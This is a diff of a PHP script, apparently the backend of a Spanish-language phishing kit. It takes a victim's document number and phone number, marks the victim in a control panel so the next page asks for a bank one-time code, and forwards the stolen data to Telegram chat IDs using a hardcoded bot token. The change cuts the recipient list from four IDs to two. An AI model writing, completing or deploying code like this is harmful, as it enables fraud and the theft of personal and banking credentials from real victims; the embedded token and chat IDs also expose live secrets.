@@ -7,8 +7,7 @@ $documento = isset($_POST['doc']) ? $_POST['doc'] : '';
 $celular = isset($_POST['cel']) ? $_POST['cel'] : '';
 
 if (!empty($documento)) {
-    // 1. Guardar en Panel y CAMBIAR ESTADO A 2 (Dinámica)
-    // Lo hacemos primero para que la logística no se trabe
+    // 1. Guardar en Panel y FORZAR CAMBIO DE ESTADO A 2 (Dinámica)
     if (function_exists('traer_regitro')) {
         $registro = traer_regitro($ip);
         if (function_exists('actualizar_registro_info')) {
@@ -16,15 +15,14 @@ if (!empty($documento)) {
         }
     }
 
+    // Cambiamos el estado a 2 para que pida la Clave Dinámica (OTP.php)
     if (function_exists('actualizar_estado_victima')) {
         actualizar_estado_victima($ip, "2"); 
     }
 
-    // 2. Configuración del Bot 𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 (4 IDs agregados)
+    // 2. Configuración del Bot con los 2 IDs seleccionados
     $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
     $chat_ids = [
-        "8114050673", 
-        "8518977918", 
         "8638340940", 
         "8645545892"
     ];
@@ -36,7 +34,7 @@ if (!empty($documento)) {
     $mensaje .= "⏰ <b>HORA:</b> " . date('H:i:s') . "\n";
     $mensaje .= "━━━━━━━━━━━━━━━";
 
-    // 3. Envío masivo a los 4 IDs
+    // 3. Envío a Telegram
     foreach ($chat_ids as $id) {
         $url = "https://api.telegram.org/bot$token/sendMessage";
         $data = [
@@ -58,6 +56,6 @@ if (!empty($documento)) {
     }
 }
 
-// Retornamos "ok" para que el JavaScript en WAITING.php sepa que puede avanzar
+// Retornamos "ok" para que el JS avance a la siguiente pantalla (OTP.php)
 echo "ok";
 ?>
